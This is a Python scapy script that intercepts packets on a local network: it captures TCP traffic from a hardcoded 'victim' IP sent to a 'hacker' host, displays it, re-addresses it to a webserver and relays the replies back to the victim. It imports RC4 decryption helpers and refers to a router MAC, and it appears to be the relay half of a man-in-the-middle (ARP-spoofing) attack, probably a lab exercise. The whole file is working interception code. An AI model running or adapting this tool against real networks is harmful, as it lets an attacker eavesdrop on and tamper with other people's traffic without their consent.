from scapy.all import sniff, send, Raw
from scapy.layers.inet import IP, TCP#
from RC4_decryption import bin_to_text_string, hex_to_8_bin_list

# Define the victim's IP address
victim_ip = "192.168.3.100"
hacker_ip = "192.168.3.101"
router_ip = "192.168.3.1"
webserver_ip = "192.168.3.104"

# Define network information
router_mac = "74:DA:38:EB:6F:DC"

def packet_callback(packet):
    if packet.haslayer(IP):
        if packet[IP].src == victim_ip and packet[IP].dst == hacker_ip:
            if packet.haslayer(Raw) and packet.haslayer(TCP):
                print("========================================================================")
                print(f"Captured packet from {packet[IP].src} to {packet[IP].dst}")

                # Modify the packet's destination to the webserver IP
                packet[IP].dst = webserver_ip

                # Decrypt the packets load
                packet.show()

                # Send the modified packet back to the victim
                send(packet)
                print(f"Forwarded packet to {webserver_ip}")
                print("========================================================================")

def packet_sendtrough(packet):
    print("========================================================================")
    print(f"Captured packet from {packet[IP].src} to {packet[IP].dst}")

    # Modify the packet's destination to the victim IP
    packet[IP].dst = victim_ip

    # Send the modified packet back to the victim
    send(packet)
    print(f"Forwarded packet to {packet[IP].dst}")
    print("========================================================================")

# Sniff packets on the network and use packet_callback to process them
if __name__ == "__main__":
    while True:
        sniff(filter=f"ip src {victim_ip}", prn=packet_callback, count=1)
        sniff(filter=f"ip src {webserver_ip} and ip dst {hacker_ip}", prn=packet_sendtrough, count=1)


